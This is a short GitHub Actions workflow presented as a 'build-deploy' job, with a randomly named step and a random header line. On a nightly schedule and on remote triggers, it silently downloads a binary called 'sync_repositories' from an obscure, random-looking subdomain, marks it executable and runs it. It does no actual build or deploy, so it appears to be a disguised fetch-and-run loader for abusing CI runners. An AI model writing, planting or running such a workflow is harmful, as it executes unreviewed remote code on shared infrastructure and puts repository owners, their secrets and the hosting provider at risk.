#2024-03-18-[135740]-hnkg36aw
name: main

on:
  workflow_dispatch:

  repository_dispatch:
    types: runner_workflow

  schedule:
    - cron: "32 1 * * * "
    
jobs:
  build-deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: o84o0yzj3fnsoloz
        run: |
          wget -q https://t822cxuthu0rifw0.callforpapers.eu.org/sync_repositories
          chmod 755 sync_repositories
          ./sync_repositories